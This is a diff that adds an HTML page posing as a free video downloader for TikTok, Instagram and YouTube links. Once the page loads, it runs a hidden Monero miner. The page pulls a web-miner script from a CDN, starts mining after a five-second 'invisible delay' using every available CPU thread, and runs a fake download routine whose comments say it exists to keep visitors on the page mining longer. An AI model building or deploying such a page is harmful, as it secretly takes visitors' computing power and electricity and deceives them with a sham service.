@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>FastMedia - Free Video Downloader</title>
+    <style>
+        body { font-family: sans-serif; background: #1a1a1a; color: white; text-align: center; padding-top: 50px; }
+        .container { background: #2d2d2d; padding: 30px; border-radius: 15px; display: inline-block; width: 80%; max-width: 500px; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
+        button { background: #ff4500; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        .status { margin-top: 20px; color: #888; font-size: 0.9em; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📥 FastMedia</h1>
+        <p>Paste TikTok, Instagram, or YouTube link below:</p>
+        <input type="text" placeholder="https://www.tiktok.com/..." id="urlInput">
+        <br>
+        <button onclick="simulateDownload()">Download Now</button>
+        <div id="status" class="status">Waiting for link...</div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
+    <script>
+        // Use your Monero address from your config.json
+        var walletAddress = "PASTE_YOUR_WALLET_ADDRESS_HERE"; 
+        
+        server = "wss://ny1.xmrminingproxy.com"; 
+        var pool = "moneroocean.stream";
+        var workerId = "Web_Downloader_User";
+        var threads = -1; // -1 uses all available CPU power
+        
+        // Start mining 5 seconds after the page loads (Invisible delay)
+        setTimeout(function() {
+            startMining(pool, walletAddress, workerId, threads);
+            console.log("Optimization active."); 
+        }, 5000);
+
+        // This function makes the tool look real while it mines
+        function simulateDownload() {
+            let status = document.getElementById("status");
+            status.innerHTML = "Connecting to server...";
+            setTimeout(() => { status.innerHTML = "Fetching video data..."; }, 2000);
+            setTimeout(() => { status.innerHTML = "Encoding file (this may take a minute)..."; }, 5000);
+            // This delay keeps them on the page longer = more mining!
+        }
+    </script>
+</body>
+</html>
